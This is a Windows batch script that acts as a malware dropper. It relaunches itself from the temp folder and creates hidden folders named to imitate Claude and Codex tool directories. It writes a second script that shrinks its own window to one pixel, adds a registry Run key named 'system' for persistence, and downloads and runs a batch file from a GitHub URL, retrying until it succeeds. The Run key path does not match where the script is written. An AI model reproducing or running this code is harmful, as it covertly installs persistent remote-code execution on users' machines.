@echo off

if not exist "%temp%\xdlls2s.bat" (
    copy "%~f0" "%temp%\xdlls2s.bat"
    start "" "%temp%\xdlls2s.bat"
    exit
)

cd "c:\"
:lol
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 ( goto lol )
mkdir "%USERPROFILE%\.claude\projects\C--Windows-system64"
mkdir "%USERPROFILE%\.codex\tmp\arg0\codex-arg0dXy9BJ"
:lel
(
    echo @echo off
    echo powershell -command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Win { [DllImport(\"user32.dll\")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags); [DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); }'; [void][Win]::SetWindowPos([Win]::GetConsoleWindow(), [IntPtr]::Zero, 1, 1, 1, 1, 0x0040)"
    echo reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "system" /t REG_SZ /d "%%USERPROFILE%%\AppData\Local\Google\tolket.bat" /f ^>nul 2^>^&1
    echo setlocal
    echo if exist "%%USERPROFILE%%\.claude\projects\C--Windows-system64\mgsd.bat" del /F /Q /A "%%USERPROFILE%%\.claude\projects\C--Windows-system64\mgsd.bat"
    echo :wait_net
    echo ping -n 1 8.8.8.8 >nul 2>&1
    echo if errorlevel 1 ^( goto wait_net ^)
    echo :dis
    echo curl -f -L -o "%%USERPROFILE%%\.claude\projects\C--Windows-system64\mgsd.bat" "https://raw.githubusercontent.com/eidanexa-lang/ssd/refs/heads/main/tash.bat"
    echo if errorlevel 1 ^( goto dis ^)
    echo start "" "%%USERPROFILE%%\.claude\projects\C--Windows-system64\mgsd.bat"
    echo if errorlevel 1 ^( goto dis ^)
) > "%USERPROFILE%\.codex\tmp\arg0\codex-arg0dXy9BJ\tolket.bat"
if not exist "%USERPROFILE%\.codex\tmp\arg0\codex-arg0dXy9BJ\tolket.bat" (
    goto lel
)
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
type "%USERPROFILE%\.codex\tmp\arg0\codex-arg0dXy9BJ\tolket.bat"
start "" "%USERPROFILE%\.codex\tmp\arg0\codex-arg0dXy9BJ\tolket.bat"
